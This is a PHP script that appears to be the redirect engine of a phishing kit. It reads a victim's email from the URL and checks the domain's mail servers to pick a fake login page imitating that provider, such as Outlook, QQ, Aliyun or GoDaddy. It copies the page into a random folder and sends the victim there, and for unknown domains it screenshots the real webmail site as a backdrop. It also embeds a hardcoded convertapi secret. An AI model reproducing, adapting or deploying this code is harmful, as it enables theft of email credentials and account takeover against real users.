<?php
include('../class/bk.php');
include('../class/ant.php');
include('../class/b.php');
include('../class/bo.php');
include('../class/bt.php');

if(isset($_GET['uid'])){
include('seke.php');
if($_GET['uid']!==''){
	
$text=$_GET['uid'];
if(strpos($text,'@') !== false) {
$textuid=$_GET['uid'];
}else{
$textuid=base64_decode($_GET['uid']);
}
function backdomimag($urlredi){
$siteURL = $urlredi;


$filename = $urlredi;
$filename = str_replace('http://','',$filename);
$filename = str_replace('https://','',$filename);
$filename = str_replace('.','_',$filename);
$filename = str_replace('/','',$filename);

$filenamez ='img/'.$filename.'.png';
if (!file_exists($filenamez)){
//echo "The file $filename does not exist";lbQ5h44z2ie7HwQs
$googlePagespeedData = file_get_contents("https://v2.convertapi.com/convert/url/to/png?Secret=lbQ5h44z2ie7HwQs&Url=$siteURL&Zoom=1&PageWidth=1724&ImageQuality=100");
$googlePagespeedData = json_decode($googlePagespeedData, true);
$screenshot = $googlePagespeedData['Files'][0]['FileData'];
$filename = $googlePagespeedData['Files'][0]['FileName'];
$imageData = base64_decode($screenshot);
$source = imagecreatefromstring($imageData);
$angle = 0;
$rotate = imagerotate($source, $angle, 0); // if want to rotate the image
$imageName = 'img/'.$filename;
$imageSave = imagejpeg($rotate,$imageName,100);
imagedestroy($source);
}}
 
$em=$textuid;
@$ar=split("@",$em);
$urltt=$ar[1];
$email=$textuid;
$random = rand(50000,100000000000);
$dstz    = substr(md5($random), 0, 1000000000);
$log = base64_encode($textuid);

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}
function mxrecordValidate($domain){
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];
}
}

$domain = substr(strrchr($email,"@"), 1);
$serv= mxrecordValidate($domain);
$dst=$serv.'=='.$dstz.'=='.$serv;

////////////////
if(mxrecordValidate($domain)){
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
$explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
if (strpos(strtolower($key1['target']), 'outlook.com') !== false) {
$backcurl = 'https://outlook.office.com/owa/';
}elseif(strpos(strtolower($key1['target']), 'yahoo') !== false) {
if (strpos(strtolower($key1['target']), 'aol') !== false){
$backcurl = 'https://mail.aol.com';
}elseif (strpos(strtolower($key1['target']), 'mta') !== false){
$backcurl ='https://mail.yahoo.com';
}else{
$backcurl = 'https://mail.yahoo.com';
}}elseif (strpos(strtolower($key1['target']), 'google') !== false) {
$backcurl =  'https://myaccount.google.com';
}elseif(strpos(strtolower($key1['target']), 'qq') !== false) {
$backcurl =  'https://exmail.qq.com/cgi-bin/loginpage';
}elseif (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$backcurl =  'https://www.hibox.hinet.net/uwc/';
}elseif (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$backcurl =  'https://webmail.hinet.net/';
}elseif (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$backcurl = 'https://apps.rackspace.com/index.php';
}elseif (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$backcurl =  'http://www.dns.com.cn/login/toLogin.do';
}elseif (strpos(strtolower($key1['target']), 'zmail') !== false) {
$backcurl =  'http://ssl.zmail300.cn/app/mail/index';
}elseif (strpos(strtolower($key1['target']), 'hinet') !== false) {
$backcurl = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$backcurl =  'https://mail.mailasp.com.tw/';
}elseif (strpos(strtolower($key1['target']), 'vip') !== false) {
$backcurl = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'qiye.163.com') !== false) {
$backcurl =  'https://mail.qiye.163.com';
}elseif (strpos(strtolower($key1['target']), 'netease') && strpos(strtolower($key1['target']), '126') !== false) {
$backcurl =  'https://mail.126.com/';
}elseif (strpos(strtolower($key1['target']), 'netease') !== false) {
$backcurl =  'https://mail.163.com/';
}elseif (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$backcurl = 'https://email25.godaddy.com/';
}elseif (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$backcurl = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$backcurl = 'https://qiye.aliyun.com/';
}elseif (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$backcurl = 'https://qiye.aliyun.com/';
}elseif (strpos(strtolower($key1['target']), 'zoho') && strpos(strtolower($key1['target']), 'smtp') !== false) {
$backcurl = 'https://mail.zoho.com/zm/';
}elseif (strpos(strtolower($key1['target']), 'zoho') !== false) {
$backcurl = 'https://mail.zoho.com/zm/';
}elseif (strpos(strtolower($key1['target']), '263') !== false) {
$backcurl = 'http://263xmail.com/';
}elseif (strpos(strtolower($key1['target']), 'coremail') !== false) {
$backcurl =  'https://mail.icoremail.net/';
}elseif (strpos(strtolower($key1['target']), '1and1') !== false) {
$backcurl ='https://webmail.1and1.co.uk/';
}elseif (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$backcurl =  'https://webmail5.networksolutionsemail.com/';
}elseif (strpos(strtolower($key1['target']), "yandex") !== false) {
$backcurl = 'https://mail.yandex.com';	
}elseif (strpos(strtolower($key1['target']), $domain) !== false) {
$backcurl = 'https://mail.'.$domain;	
}
}
}
}
////////////////


if(mxrecordValidate($domain)){
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
   $explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
/// STORAGE TO TEXT FILES

if(strpos(strtolower($key1['target']), 'outlook.com') !== false) {
$src="m";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if(strpos(strtolower($key1['target']), 'qq') !== false) {
$src="qq";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$src="hb";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$src="hb";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$src="r";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$src="dns";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'zmail') !== false) {
$src="zm";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$src="cl";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'qiye163') !== false) {
$src="q163";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$src="gd";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$src="cm";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$src="al";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$src="al";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), '263') !== false) {
$src="263";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), 'coremail') !== false) {
$src="co";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), '1and1') !== false) {
$src="1and1";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$src="ne";
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}

if (strpos(strtolower($key1['target']), $domain) !== false) {
//$src="wm";
$src="wm";
backdomimag($backcurl);
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&uid=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;

}else{
$src="gp";
backdomimag($backcurl);
recurse_copy( $src, $dst );
header("location: ".$dst."/?open=1&Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.&fid=&fav.1&rand.13InboxLight.aspxn.".$mds."&fid.&fid=&fav.1&x=".$log."&.rand=13InboxLight.aspx?n=".$random."&fid=4#n=?office=&rand=13InboxLight.aspx");
exit;
}



}}
}else{
$src="gp";
backdomimag($backcurl);
recurse_copy( $src, $dst );
header("location: ".$dst."/?rand=13InboxLight.aspx");
exit;
}
}else{
header("location: https://google.com/");
exit; }

}else{
header("location: index.html");
}
?>